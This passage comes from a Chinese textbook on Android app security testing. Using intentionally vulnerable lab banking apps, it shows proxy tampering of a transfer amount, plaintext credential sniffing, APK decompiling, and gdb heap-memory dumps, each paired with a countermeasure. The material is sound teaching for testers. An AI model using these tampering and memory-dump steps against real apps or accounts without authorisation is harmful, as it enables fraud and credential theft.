 </div>

Binding标签用于设置在中间传输数据的代理服务器，设置当前PC的IP地址和端口号。我将

自己的IP地址设置为192.168.0.3，端口号随机设置为8008。

Request handling标签用于设置代理服务器需要传达数据的目的地, 在此设置虚拟程序要连接的服务器IP和端口号, 也就是设置服务器IP 127.0.0.1和端口号8080。

 </div>

最后，如果下端Intercept Client Requests/Server Reposes的Intercept requests/responses based on the following rules被选中，则取消勾选。之后会对此进行详细说明。

接着设置虚拟App的代理服务器。

 </div>

由图5-26可知，运行虚拟程序后按F2键（模拟器的“菜单”键），可以看到左图底部菜单。

在此点击Reset按钮，那么为了测试相关程序而生成或修改的数据就会恢复初始状态。点击preferences就会显示可以设置服务器IP和端口号的输入框。因为已经在代理软件中输入了服务器IP和端口号，而且数据需要通过代理传送，所以在此输入代理服务器IP和端口号。

设置完成后，使用相关程序即可看到发送到代理软件的变量值。

 </div>

既然已经可以查看虚拟程序的变量值，下面对其进行检测。

 </div>

登录到虚拟银行程序后，出现如图5-28所示的帮助页面。在帮助页面点击Transfer后，会出现可以转账到其他银行的画面。转账时，代理服务器会截获变量值，并可以修改变量值以修改相关金额。

如果想对变量进行修改，需选择之前介绍过的Intercept Client Requests/Server Reposes下的Intercept requests/responses based on the following rules选项。

 </div>

选择Intercept requests/responses based on the following rules后，根据设置规则传输的值将临时保存到代理服务器。只有获得代理工具允许，数据才能发送到服务器（Requests）或客户端（Responses）。

之前不需要 “代理工具的允许”，所以没有选择。但是为了修改变量，就必须得到 “代理工具的允许”。

如果有读者没能理解清楚，请通过实操加深理解。

假设用户想从Debit转账$20到Credit。检测人员会尝试在此过程中将$20改为$1。

 </div>

在输入框输入$20后，点击Transfer不会立即转到下一页面，可能有人会以为原因在于数据发送速度缓慢。但这是很正常的，从代理工具的Intercept中可以看到，代理服务器故意阻止数据传输。

在该部分可以修改数据，检测人员可以把看似是金额相关变量的Amount值20.0换为1.0，然后点击Forward。

通过 “代理工具的允许”，被修改的值就这样发送到了服务器。

 </div>

如图5-32所示，发送的值不是$20$而是$1$。由此可知，Amount变量易受攻击。这个方法与Web漏洞诊断非常类似，App也是通过这种方法进行诊断的。

 </div>

应对方案如下。通过有效性检查可以应对变量修改漏洞。

第一，检查用户会话。

if to_account.user != session.user or from_account.user != session.user:
    return error("E6")

第二，根据变量的性质，通过检查数据类型、字符串范围、设置最大/最小长度、是否允许NULL值等进行验证。

#### ⑩ 使用手机设置代理的方法

前文通过虚拟银行程序讲解了代理设置方法，但漏洞检测人员解决项目时会使用各种程序进行检测，实际应用中应该没有与之前相同的代理设置软件。那么，如何设置代理以在手机上诊断App呢？下面介绍一种简单的方法。

如前所述，运行菜单Proxy > Options的proxy Listeners Add项，并点击Add按钮，然后只在Binding标签中输入PC的IP地址和随机端口号。

 </div>

接着需要设置将安装待分析App的手机代理。要想简单设置代理，需要“ProxyDroid”程序。可以通过谷歌应用市场免费下载。

运行 “ProxyDroid” App后，显示如图5-34所示画面。与虚拟程序中设置代理服务器的过程相同，在相关App的Host和Port输入框输入服务器IP地址和端口号。

 </div>

为了检测代理软件是否正常运转，运行手机浏览器后进行简单的搜索操作。可以看到，传输的值都经过代理服务器，形成了可以进行漏洞检测的环境。

 </div>

### 5.5 使用易受攻击的密码

Android程序虽然会要求用户尽量使用高级加密密码，但是也允许设置易受攻击（简单）的密码。攻击者会通过猜测输入法或字典穷举法轻松破解这种账号信息。本节会通过手机银行程序的密码设置给出应对方案。

输入程序提供的账号和密码（jdoe/password、bsmith/password）后，会出现设置新密码的输入框。本节是密码相关练习，将讲解“易受攻击的密码”漏洞。

为了查看相应程序的密码设置状态，在密码设置画面输入 “password”，如图5-36所示，查看是否可以设置易受攻击的密码。

 </div>

   </div>

可以看到，允许输入简单的密码，这很容易被猜测输入法或字典穷举法破解。

为了防范针对程序账号和密码的猜测输入法或字典穷举法工具，需要设置如下策略。

##### 安全的密码设置策略

☐ 混合使用10位以上的英文大小写字母、数字、特殊字符。

☐ 禁止同一字符连续重复4次及以上。

☐ 整理现有密码，禁止使用相同密码。

☐ 得到初始密码后，要求用户第一次登录时修改密码。

☐ 设置密码修改周期（安全设置策略）。

☐ 禁止使用容易猜测的密码。

☐ 禁止使用字典里的简单单词或姓名。

☐ 禁止使用默认密码。

☐ 禁止使用个人信息作为相关密码。

☐ 尽量把记录密码的字条放在不容易找到的地方。

 </div>

相应程序要求设置使用包含大小写和特殊字符在内的、6个字符以上的密码，禁止设置“password”等简单密码。

### 5.6 传输层保护不足（非加密通信）

移动服务App会在第一次登录时要求输入账号和密码，之后通常都会保存账号信息。因为大部分用户不愿意在经常使用的门户网站和SNS网站上输入账号和密码，所以会保持登录状态。

移动设备和服务器之间会通过网络收发大量数据包。这些数据也可能不是包含重要信息的数据，但是会包含服务器登录信息和结算过程中发生的信用卡和密码信息。还有和Web服务相同的、可以输入重要信息的部分，找回密码、Q&A论坛上的电话号码、电子邮件等都属于这一类。用户使用无线AP时，无法预测这些信息都会流向哪里。

因此，开发App时，发送这种重要信息的部分要使用SSL通信或数据包加密解决方案，防止重要信息泄漏到网络。

如果客户端和服务器之间的数据包传输使用明文方式，将会成为攻击者的嗅探（在中间截取数据包的行为）对象。本节会使用WireShark截取虚拟银行程序的登录过程，查看是否在传输层进行了加密，检查漏洞并提出应对方案。

开始诊断漏洞前，先介绍与诊断工具集成软件BackTrack类似的、Android环境下的漏洞分析相关软件集成系统AppUse。我们会使用AppUse分析保护不足的传输层漏洞。

AppUse将测试中需要的Android诊断工具和渗透测试对象App都安装到同一操作系统，并通过https://appsec-labs.com/AppUse提供免费下载。

 </div>

访问AppUse网站会出现如图5-38所示页面，点击“下载”按钮下载虚拟镜像文件。解压下载的文件后，可以使用VMware运行AppUse系统。

 </div>

运行AppUse时，为了提供诊断时的便利，点击AppUse Dashboard图标，用仪表盘形态显示漏洞诊断工具和需要进行渗透测试的App，如图5-39所示，功能如表5-1所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>分 类</td><td style='text-align: center; word-wrap: break-word;'>说 明</td><td style='text-align: center; word-wrap: break-word;'>详细功能</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Android</td><td style='text-align: center; word-wrap: break-word;'>执行模拟器相关功能</td><td style='text-align: center; word-wrap: break-word;'>运行模拟器、重启adb、查看设备、查看Root设备、截图功能、运行adb shell、打开对象文件夹、删除对象文件夹</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Tools</td><td style='text-align: center; word-wrap: break-word;'>执行诊断相关功能</td><td style='text-align: center; word-wrap: break-word;'>运行Burp代理、运行WireShark、运行Eclipse、运行Mercury、运行SQLite浏览器、运行shell</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Reversing</td><td style='text-align: center; word-wrap: break-word;'>执行逆向工程相关功能</td><td style='text-align: center; word-wrap: break-word;'>使用APK Content Dex2jar解压文件、运行Baksmali、运行Smali、运行JD-GUI、运行APKTool</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>ReFramework</td><td style='text-align: center; word-wrap: break-word;'>提供运行程序时可操作的环境</td><td style='text-align: center; word-wrap: break-word;'>运行ReFramework、激活或禁用JAR、设置网络权限</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Training</td><td style='text-align: center; word-wrap: break-word;'>提供渗透测试对象程序</td><td style='text-align: center; word-wrap: break-word;'>ExploitMe HTTP、ExploitMe HTTPS、GoatDroid、HackMePal</td></tr></table>

此处只列出功能，不再赘述。通过对虚拟手机银行程序进行漏洞诊断而明白漏洞诊断的概念后，再研究AppUse虚拟镜像相关功能时，各位会感受到学习的乐趣。

那么，现在开始对 “保护不足” 漏洞进行诊断吧。介绍AppUse的原因在于，AppUse会提供虚拟手机银行程序和服务器。

为了运行AppUse提供的虚拟手机银行程序(ExploitMe)，在图5-40的仪表盘中选择Android > Launch Emulator运行模拟器。接着会锁定画面，此时可以输入“1234”并正常使用模拟器。

 </div>

之后点击底部圆形图标，跳转到程序列表窗口，点击ExploitMe程序运行虚拟手机银行程序。

 </div>

运行程序不等于完成环境构建，还需通过设置正常连接到服务器。

运行程序后，按ESC键移动到图5-41的第一个画面。按F2键或点击Menu后，选择Preferences移动到设置窗口。

在设置窗口可以设置相关程序需要连接服务器, 查看Bank Service Address是否为 “10.0.2.2”, HTTP Port是否为 “8080” 端口, 然后设置成正常指向本地服务器的地址和端口。

   </div>

提示 PC机的本地IP地址是127.0.0.1，手机的本地IP地址是10.0.0.2。因为模拟器是移动环境，所以10.0.2.2是本地IP地址，此处指向本地PC。

接着运行ExploitMe的手机服务器。如图5-42所示，运行终端窗口后，移动到~/Desktop/AppUse/Targets/ExploitMe/LabServer/目录，然后执行python app.py命令以运行手机服务器。

 </div>

运行ExploitMe和服务器后，所有准备已完毕。开始诊断“传输层保护不足”漏洞前，运行Tools > Launch Wireshark数据包截获工具，选择Capture > Interface查看本地IP地址127.0.0.1（因为服务器在本地）。

 </div>

如图5-44所示，在相关程序中输入jdoe/password，设置当前手机可以访问的密码即可成功登录。

 </div>

如果存在 “传输层保护不足” 漏洞，账号和密码就会成为嗅探攻击对象。为了证明这种说法，使用数据包截获工具WireShark分析数据包信息。

 </div>

由图5-45可以看到，已经截获账号变量username和password的值（jdoe/password）。

#### 使用SSL/TLS加密

SSL是安全套接字层（Secure Socket Layer）的简称。1994年由Netscape公司开发，用于传输层的安全通信和保障数据完整。因为用于传输层，所以可以应用于HTTP、FTP、SMTP等所有应

   </div>

用层。之后发展成为TLS（Transport Layer Security），并实现标准化。HTTPS是强化后的HTTP协议，应用了SSL或TLS协议。

SSL使用证书确认链接，证书会保存到安全服务器，用于加密数据或查看客户端。

证书类型如表5-2所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>分 类 说 明</td><td style='text-align: center; word-wrap: break-word;'>应用方法</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>CA</td><td style='text-align: center; word-wrap: break-word;'>证书</td><td style='text-align: center; word-wrap: break-word;'>CA（认证机构）是向用户发放SSL证书的机构，获得网络证书后可以应用SSL通信。可通过证书提供机构或Web主机商获取详细的安装方法、资源、支持服务，以应用SSL</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>自签名</td><td style='text-align: center; word-wrap: break-word;'>证书</td><td style='text-align: center; word-wrap: break-word;'>用户生成的证书，证书发行者和用户一致。比CA证书的通信速度更快，但是要在连接服务器的客户端设置为信任签名者。使用TLS和SSL的开放源码OpenSSL库，这两种库通过网络传输数据（https://github.com/eighthave/openssl-android）。可通过Google搜索轻松查找实现方法</td></tr></table>

### 5.7 源代码信息泄漏

本节将介绍第三种应对方案，对preferences.xml文件保存的重要信息进行加密。但是，如果相关程序源代码的加密算法泄漏了，最终还是可以恢复preferences.xml文件的密码。本节会检查源代码是否泄漏重要信息，并给出应对方案。

我们之前使用虚拟手机银行程序的Base版本进行实操，但本节需要加密版本，所以需要重新下载BasicEncryptionSolution版本。此处会使用逆向工程技术进行漏洞诊断。

如图5-46所示，使用apktool以调试模式导出apk文件，并把转换后的文件保存到out目录（使用Eclipse运行相关文件后，会在bin文件夹生成apk文件）。

 </div>

浏览out目录时可以看到，已转换为smali文件（DalvikOpcode）和资源（resource）文件，如图5-47所示。

 </div>

 </div>

浏览smali文件中的CrytoTool.smali文件时，可以知道使用了哪种加密算法，如图5-49所示。并可以通过这些信息恢复被加密的重要信息。

 </div>

这种smali代码还可以通过NetBeans等工具直接泄漏源代码或进行调试, 应对方法是对已开发的程序源代码进行加密。

# 1. 源代码加密工具：Proguard

源代码加密工具有Proguard，其优点是可以把类、方法等参数名转换为a、b、dd等无意义的名称，阻碍分析。缺点是不会对变量值进行加密，所以攻击者只要花点时间就可以成功分析。5.11节将详细介绍Proguard使用方法。

# 2. 付费加密工具：Dexguard（Proguard的付费版本）、AndroidEnv

付费加密工具有Dexguard、AndroidEnv等。介绍Proguard时将同时介绍Dexguard。AndroidEnv是美国SafeNet公司开发的工具，使用了Envelope加密技术，不仅可以加密变量和函数名，也会扰乱程序的流程并进行加密，防止黑客通过源代码获取信息。

### 5.8 泄漏重要信息

目前，智能手机的应用范围越来越广。上下班途中或休息时，只要有空，人们就会通过智能手机利用网络服务、玩游戏、看视频、阅读等。在这种移动时代，服务商最需要重视的是内容（Contents）。因为内容中会包含制造商和流通商的商业费用，所以对版权的保护非常重要。无论是智能手机还是PC支持的付费内容，任何服务商都不愿意被非法复制并随意流通。

从服务器上下载的内容可以被保存到手机的任何空间, 用户可以通过切换设备平台或利用工具而访问相关内容, 所以必须针对内容进行安全设置。

图5-50的示例表示，使用电子书（E-Book）App时，在临时目录（temp）保存相关HTML、CSS文件。如果把这些文件压缩成电子书格式epub，就可以在任何电子书程序上浏览，无需付费即可恶意传播。

 </div>

免费E-Book基本不会涉及版权方面的问题，但是如果连一些付费内容也没有应用DRM或其他保护措施，这会比在PC上提供的E-Book格式更容易复制和传播。

##### EPUB

EPUB（electronic publication）是国际数字出版论坛（IDPF, International Digital Publishing Forum）制定的开放型电子图书标准。EPUB是可重排版（reflowable）的，这说明阅读使用EPUB格式制作的内容时，会根据显示设备的格式和大小而自动调整到最佳显示状态。EPUB由国际数字出版论坛指定为公认标准，以替代2007年9月之前的开放型eBook标准（出处：维基百科）。

Epub文件格式被定为电子书标准。虽然也有PDF电子书格式，但大部分电子书服务会使用epub扩展名的zip文件。

 </div>

查看解压后的目录和文件可以看到包含了哪些文件。此处主要查看3种类型：使用网页浏览器时经常看到的HTML（文字）、CSS（样式）、IMAGE（图片）。Epub和手机浏览器只会向我们显示这些文件。

#### 5.8.1 泄漏内存中的重要信息

运行App时，从服务器上得到的信息和用户输入的信息会临时保存到内存。通过之前的案例可知，恶意代码可以获取移动设备的Root权限。如果渗透到移动设备并导出正在运行的线程内存信息，就能轻松获取内存中的信息。内存包含账号信息就能给Web服务器带来二次打击。需要使用自我加密或内存安全解决方案以禁止内存包含敏感信息。

与其他OS相同，Android系统会把用户输入值和相应结果临时保存到堆内存区域。获得Android系统的Root权限时，因为手机服务账号信息、公认认证书密码、金融密码、内容服务器密码等诸多信息都保存于内存，所以可能出现二次危害。

检测时有多种方法可以查看内存信息，此处会介绍其中3种方法。第一种是使用诊断时常用的gdb命令，多用作调试器。因为选项中包含了可以导出内存信息的dump memory命令，可以使用此命令导出堆内存领域以进行分析。

cat maps | more
cat maps | more
00008000-00009000 r-xp 00000000 b3:02 277 /system/bin/app_process
00009000-0000a000 rw-p 00001000 b3:02 277 /system/bin/app_process
0000a000-0072e000 rw-p 00000000 00:00 0 [heap]
10000000-10001000 ---p 00000000 00:00 0
10001000-10100000 rw-p 00000000 00:00 0
40000000-40011000 r--s 00000000 00:0a 573 /dev/_properties__ (deleted)
40011000-40012000 r--p 00000000 00:00 0
40012000-40854000 rw-p 00000000 00:04 966 /dev/ashmem/dalvik-heap (deleted)
40854000-44012000 ---p 00842000 00:04 966 /dev/ashmem/dalvik-heap (deleted)
44012000-44112000 rw-p 00000000 00:04 967 /dev/ashmem/dalvik-bitmap-1
(deleted)
44112000-44212000 rw-p 00000000 00:04 968 /dev/ashmem/dalvik-bitmap-2
(deleted)
44212000-44293000 rw-p 00000000 00:04 969 /dev/ashmem/dalvik-card-table
(deleted)
44293000-44296000 rw-p 00000000 00:00 0
44296000-44297000 ---p 00000000 00:04 970 /dev/ashmem/dalvik-LinearAlloc
(deleted)
44297000-444f7000 rw-p 00001000 00:04 970 /dev/ashmem/dalvik-LinearAlloc
(deleted)
444f7000-44796000 ---p 00261000 00:04 970 /dev/ashmem/dalvik-LinearAlloc
--More--

GDB will be unable to debug shared library initializers and track explicitly loaded dynamic code.
0xafd0c63c in epoll_wait()
    from /system/lib/libc.so
(gdb) dump memory ./dump_01.bin 0x0000a000 0x0072e000
dump memory ./dump_01.bin 0x0000a000 0x0072e000

c:\>adb pull /data/local/tmp/dump_01.bin
3995 KB/s (7487488 bytes in 1.830s)

使用Hex查看工具在导出的文件中搜索敏感字符。点击新菜单或输入内容时，信息会被更改，所以每次都需要重新导出。

 </div>

虽然可以使用gdb调试器导出，但我们选择可以在Android环境下运行的procmem或memscan。可以省略一两个过程，长期使用时最好进行编译。

 </div>

经常对程序进行诊断时,各位会想使用更方便的方法,也会自己开发工作上可以用到的工具。渗透测试团队TeamCR@K（A3Security）开发了可以导出线程内存并搜索数据的App。可以使用CheckBox格式选择导出内容，诊断时很有用。

 </div>

最后的方法是，在模拟器上安装App后，使用内存搜索工具。分析恶意代码时会使用模拟器或虚拟主机OS环境。诊断服务型App时，因为很多都不能在模拟器上运行，所以很少使用这个方法。但分析简单App时，使用此方法会大大提高业务效率。

对游戏程序的内存进行分析/操作的Tsearch也可以在Android环境下使用，连接emulator-arm.exe程序即可。此程序的优点是，可以实时刷新修改后的内存区域，从而对内存进行快速搜索。

 </div>

#### 5.8.2 虚拟程序实操

与之前的讲解相同，推荐各位使用BasicEncryptionSolution版本进行实操。在多种内存分析方法中，本节会介绍使用MAT(Memory Analyzer Tool)分析程序内存的方法。此工具是Eclipse提供的插件，可以根据操作系统版本从http://www.eclipse.org/mat/选择下载。

使用内存分析器（Memory Analyzer）分析内存之前，需要待分析程序的内存导出文件，可以使用Eclipse提取导出文件。

 </div>

点击Eclipse右上角的DDMS即可查看当前正在运行的设备信息，在左侧列表（安装在设备中的软件目录）选择需导出的程序后，点击顶端Dump HPROF file即可获取内存导出文件。

但是，使用这种方式导出的“com.securitycompass.androidlabs.basicencryptionsolution.hprof”是DalvikVM文件，需要转换成Java格式。可以使用hprof-conv工具进行转换。

运行cmd窗口，在Android安装目录下的\sdk\tools文件夹运行hprof-conv.exe com.securitycompass.androidlabs.basicencryptionsolution.hproffixed.hprof命令，生成Java格式的内存导出文件fixed.hprof，如图5-57所示。

 </div>

接着运行内存分析器，选择顶端的File > Open Heap Dump，导入“fixed.hprof”内存导出文件（导入文件后能看到如图5-58所示的窗口，点击Leak Suspercts Report后，点击Finish完成导入）。

 </div>

导入内存导出文件后，会出现如图5-59所示的初始画面，通过如下过程可以分析分配到堆内存后没有释放的内存。点击顶端的Open Dominator Tree for entire heap。

 </div>

点击Group by package，按照不同软件包轻松查看。

 </div>

在根据软件包分类的内存列表中，找出BankingApplication类后点击鼠标右键，选择如图5-61所示的菜单。

 </div>

由图5-62可知，因为没有及时释放内存而泄露了jdoe/password重要信息。

 </div>

分配内存后没有及时释放，从而导致系统内存枯竭时出现的错误称为“内存泄漏”。内存泄漏不仅会使内存枯竭，也会泄漏内存信息。

开发Android程序时，使用完分配的内存后应及时释放。

### 5.9 泄漏日志信息

Android设备会向程序员实时发送日志，提供有用的信息。但是也会把正在执行的函数、方法、错误代码等有用信息提供给攻击者，如果其中包含重要信息就会有被恶意使用的危险。本节将分析虚拟银行程序会泄漏哪些日志内容，并提出应对方案。

使用LogCat查看手机日志信息。分析前，进入adb工具所在目录，运行adb logcat命令，如图5-63所示。

 </div>

运行虚拟银行程序的账号（Accounts）功能，检查日志内是否包含账号信息。

 </div>

如图5-65所示，正在实时记录各种日志。因为包含了虚拟银行程序的账号信息，所以可能被攻击者恶意使用。

 </div>

应对方案如下。虽然详细显示日志对开发人员有利，但是攻击者也会利用这些信息，所以开发人员应尽量避免日志里包含会话密钥、重要数据等敏感信息。

下列源代码是使用Log函数显示信息的示例，需要注意，参数不要包含重要信息。

public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);
    Toast.makeText(getApplicationContext(), "onCreate",
                        Toast.LENGTH_SHORT).show();
    Log.i("Logtest", "info");
    Log.w("Logtest", "warn");
    Log.e("Logtest", "error");
    Log.d("Logtest", "debug");
}

### 5.10 Web 服务漏洞项目诊断

诊断手机App时，App和服务器之间必须通信。也有一些与服务器交换数据的案例，但大部分都会与Web服务一样使用服务器。手机App只通过活动视图显示内容，所以一般都会包含Web服务诊断项目。

App使用的服务器和Web服务中运行的不是同一服务器时，应对所有服务器进行诊断。

每个公司的诊断方法都不同，但基本都会以OWASP TOP 10为基础。

Web程序十大漏洞（OWASP TOP 10）是OWASP研究项目中的一个分支项目。OWASP TOP 10 以3年为周期，在2004年、2007年、2010年、2013年均进行了发布。

每次发布更新时都会更改顺序和术语，有的项目会合并后消失。加深显示的部分是该年度修

   </div>

改的部分。

图5-66比较了2010年和2013年的OWASP TOP 10安全威胁，能看到添加或修改的新项目。

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td colspan="2">OWASP Top 10 - 2010 (Previous)</td><td style='text-align: center; word-wrap: break-word;'>OWASP Top 10 - 2013 (New)</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>A1 - Injection</td><td style='text-align: center; word-wrap: break-word;'>A1 - Injection</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>A3 - Broken Authentication and Session Management</td><td style='text-align: center; word-wrap: break-word;'>A2 - Broken Authentication and Session Management</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>A2 - Cross-Site Scripting (XSS)</td><td style='text-align: center; word-wrap: break-word;'>A3 - Cross-Site Scripting (XSS)</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>A4 - Insecure Direct Object References</td><td style='text-align: center; word-wrap: break-word;'>A4 - Insecure Direct Object References</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>A6 - Security Misconfiguration</td><td style='text-align: center; word-wrap: break-word;'>A5 - Security Misconfiguration</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>A7 - Insecure Cryptographic Storage - Merged with A9 →</td><td style='text-align: center; word-wrap: break-word;'>A6 - Sensitive Data Exposure</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>A8 - Failure to Restrict URL Access - Broadened into →</td><td style='text-align: center; word-wrap: break-word;'>A7 - Missing Function Level Access Control</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>A5 - Cross-Site Request Forgery (CSRF)</td><td style='text-align: center; word-wrap: break-word;'>A8 - Cross-Site Request Forgery (CSRF)</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>&lt;buried in AG: Security Misconfiguration&gt;</td><td style='text-align: center; word-wrap: break-word;'>A9 - Using Known Vulnerable Components</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>A10 - Unvalidated Redirects and Forwards</td><td style='text-align: center; word-wrap: break-word;'>A10 - Unvalidated Redirects and Forwards</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>A9 - Insufficient Transport Layer Protection</td><td style='text-align: center; word-wrap: break-word;'>Merged with 2010-A7 into new 2013-A6</td><td style='text-align: center; word-wrap: break-word;'></td></tr></table>

 </div>

##### ☑ OWASP TOP 2013修改内容

第一个修改的项目是A6，“泄漏重要信息”（Sensitive Data Exposure）项目。服务中最重要的是，需要诊断数据是否得到安全保存或管理。重要信息在客户端和服务器端之间传输时，需要使用加密通信（SSL）。A6项目需要确认数据是否加密保存、通信过程是否加密、个人信息是否加密。

数据泄漏包括没有检验用户输入而产生的SQL注入攻击带来的数据泄漏、在同一网段通过嗅探获取未加密的内容等。

第二个修改的项目是A7，“欠缺的访问限制函数”（Missing Function Level Access Control）项目。需要查看管理员页面、只允许其他用户访问的页面、应当限制访问的页面中是否使用了正确的权限等级设置进程（函数）。“欠缺的认证处理”、“欠缺的访问限制”等项目是很重要的安全威胁检查项目，特别是泄漏登录页面后的管理页面就等同于泄漏了管理员账号，必须在开发阶段进行等级限制。

第三个修改的项目是A9，“使用存在已发布漏洞的元件”（Using Components with Known Vulnerabilities）项目。论坛综合解决方案、博客、简历管理系统等CMS系统的使用率越来越高，这些程序对公司缩减成本做出了很大贡献，但它们是很好的黑客攻击对象。黑客可以对这些开源程序进行白箱操作（WhiteBox testing）。安全管理员需要掌握各部分使用的元件，对各个元件的漏洞进行跟踪应对。

以上介绍了针对Android App的漏洞诊断。如果有读者也对iOS的诊断感兴趣——虽然脱离了本书主题——可以参考下列网址。

☐ https://speakerdeck.com/dmayer/source-boston-2014-idb-ios-blackbox-pentesting

☐ 短链接：http://goo.gl/lbMCp6

### 5.11 App 应对方案：加密源代码

通过前面的学习，我们知道Android apk文件是使用Java编写的。Java语言与C语言不同，会生成字节码类文件，可以在任何安装JVM的系统上运行。字节码与C语言生成的二进制文件不同，可以轻松对其进行反编译。反编译过程已经讲过了，接下来了解应对方法。

2013年3月的统计结果显示，韩国手机OS的市场占有率分别为：Android 90.1%、iOS 9.6%、其他0.3%。

芬兰安全公司F-Secure公开的资料显示，2012年发现的新恶意代码和变种共为301个，其中79%针对Android系统。2010年发现的恶意代码中，针对Android系统的恶意代码比例是11.25%，2011年是66.7%，呈逐年上升趋势。仅2014年第四季度就有96%的手机恶意代码是针对Android系统的。

大部分Android恶意代码会重打包用户量比较多的程序以插入恶意代码,或分析App后窃取用户信息。

重打包（repackaging）是伪造Android程序的方法，所以开发Android软件的金融机构或用户群比较多的App时，为了应对此类问题，都会对重要部分使用NDK。如果不使用NDK，那么为了防止类、方法、字段等信息被恶意使用，需要对代码加密。下面了解ADT（Android Developer Tools）包含的Android App加密工具Proguard。

#### 5.11.1 ProGuard

ProGuard开源程序可以搜索并删除Java代码中不使用的类、字段、方法以缩减代码大小，还可以加密类、字段、方法等的名称。该软件由Eric Lafortune开发，不仅可以在Android系统下使用，也可以用于所有Java平台。Android SDK从2010年的Android 2.3、Android SDK r08、ADT 8.01开始包含ProGuard。

ADT包含的ProGaurd只能在发行版中使用，而其他版本中，即使用Eclipse调试、编译，也无法使用。

如图5-67所示, 选择Android Tools > Export Signed Application Package或选择Android Tools > Export Unsigned Application Package进行编译时, 会生成使用ProGuard的apk文件。

 </div>

在图5-67中选择已打开项目后，点击鼠标右键选择Android Tools菜单，出现子菜单。在子菜单中选择Export Signed Application Package后，选择开发人员使用的keystore。

#### 5.11.2 用ProGaurd生成密钥

生成密钥指的是，在发行项目的过程中，使用程序员固有的密钥署名App。下面为第一次接触该过程的读者进行简单讲解。在Export Android Application菜单指定需要导出的项目名称。

 </div>

如图5-69所示，在Create new keystore输入框输入文件位置和密码。本书使用“112233”作为密码。

 </div>

接着输入创建人信息即可，如图5-70所示。不需要填写所有信息。

 </div>

别名（Alias）是生成密钥后开始使用时显示的名称。输入生成密钥时设置的密码。

 </div>

如图5-72所示，设置署名apk文件的保存路径。

 </div>

#### 5.11.3 设置ProGuard

我用于测试的ADT的版本是v21.1.0-569685。在ADT v21.1.0版本下使用低版本ADT ProGuard的设置文件时，会出现“找不到proguard.config文件”的错误，如图5-74所示。因为在ADT v21.1.0版本中生成的设置文件名不是proguard.config，而是proguard-project.txt。当然，如果把proguard-project.txt文件名改为proguard.config，也能正常运行。

 </div>

 </div>

从图5-73中可以看到,proguard.config路径设置为$\{sdk.dir\}/tools/proguard/proguard-android.txt:proguard-project.txt，项目设置路径Workspace/项目/proguard-project.txt中如果没有ProGuard相关设置，编译器会利用$\{sdk.dir\}/tools/proguard/proguard-android.txt文件中定义的ADT默认设置使用ProGuard。

ADT提供的ProGuard默认设置是图5-75中的proguard-android-optimize.txt和proguard-android.txt。proguard-android-optimize.txt中包含了ProGuard设置的优化选项，proguard-android.txt中包含了谷歌推荐的ProGuard加密设置。

 </div>

 </div>

   </div>

项，编译器就不会使用${sdk.dir}/tools/proguard/proguard-android.txt文件中设置的默认选项，而会使用proguard-project.txt中的设置以运行ProGuard。

如果各位不熟悉ProGuard的设置，推荐使用${sdk.dir}/tools/proguard/proguardandroid.txt默认选项。proguard-android.txt中定义的ADT ProGuard默认选项参见下表。

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>主要选项</td><td style='text-align: center; word-wrap: break-word;'>说明</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-dontusemixedcaseclassnames</td><td style='text-align: center; word-wrap: break-word;'>在Windows这种不区分大小写的操作系统上使用ProGuard时，需要设置该选项，否则可能出现错误</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-dontskipnonpubliclibraryclasses</td><td style='text-align: center; word-wrap: break-word;'>使用该选项会防止跳过（skip）non-public类库。ProGuard 4.5及以上版本为默认设置</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-verbose</td><td style='text-align: center; word-wrap: break-word;'>使用该选项可以详细查看利用ProGuard生成的文件中的栈轨迹（stack trace）或异常情况处理信息</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-dontoptimize</td><td style='text-align: center; word-wrap: break-word;'>该选项是优化相关选项。ADT的默认设置不会对input class文件进行优化。如果不使用该选项，ProGuard会默认对所有方法进行位元码级优化</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-dontpreverify</td><td style='text-align: center; word-wrap: break-word;'>不进行预审（Preverify）过程。Java 6中的预审是可选的，但是Java 7中是必选的。如果只针对Android，则不需要预审</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-keepattributes *Annotation*</td><td style='text-align: center; word-wrap: break-word;'>需要维持的属性 *注释* 使用ProGuard时如果出现问题，以keep开始的选项会维持各类和方法的属性</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-keep public class</td><td style='text-align: center; word-wrap: break-word;'>不对public class进行加密</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-keep public class</td><td style='text-align: center; word-wrap: break-word;'>该选项不更改Public 